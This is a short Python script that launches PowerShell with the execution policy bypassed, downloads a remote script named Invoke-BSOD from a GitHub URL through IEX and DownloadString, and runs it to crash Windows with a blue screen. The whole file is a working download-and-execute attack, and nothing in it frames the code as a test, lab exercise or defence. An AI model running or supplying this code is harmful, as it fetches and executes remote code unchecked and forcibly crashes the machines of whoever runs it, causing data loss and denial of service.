import subprocess

# PowerShell command to download and execute the script
ps_command = """
IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));
Invoke-BSOD
"""

# Command to run PowerShell script
command = ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_command]

try:
    # Run the PowerShell command
    result = subprocess.run(command, check=True, text=True, capture_output=True)
    
    # Print the output of the command
    print("Script Output:", result.stdout)
    
    # Print any errors from the command
    if result.stderr:
        print("Script Errors:", result.stderr)
except subprocess.CalledProcessError as e:
    print(f"Error running PowerShell script: {e}")
